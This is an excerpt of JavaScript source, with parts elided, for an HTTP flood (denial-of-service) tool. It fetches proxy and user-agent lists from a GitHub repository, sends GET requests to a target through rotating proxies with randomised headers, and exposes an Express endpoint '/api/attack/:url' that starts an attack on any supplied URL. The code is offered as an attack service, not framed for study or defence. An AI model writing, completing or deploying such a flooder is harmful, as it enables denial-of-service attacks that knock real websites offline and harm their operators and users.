...
const proxyURL = 'https://github.com/HanX-ID/proxy-ua/raw/refs/heads/main/proxy.txt';
const uaURL = 'https://github.com/HanX-ID/proxy-ua/raw/refs/heads/main/ua.txt';
...
function send(target, proxy, ua) {
  ...
  axios.get(target, {
    ...
    headers: {
      'User-Agent': ua,
      'Accept': rand(acceptHeader),
      'Accept-Encoding': rand(encodingHeader),
      'Referer': rand(referers),
      'Accept-Language': rand(langHeader),
      'Cache-Control': rand(cacheControl),
      'DNT': '1',
...
app.get('/api/attack/:url(*)', async (req, res) => {
  ...
  attack(target);
  res.send(`attack started to ${target}`);
});

app.listen(port, () => {
  console.log(`[ + ] server running on http://localhost:${port}/api/attack/`);
});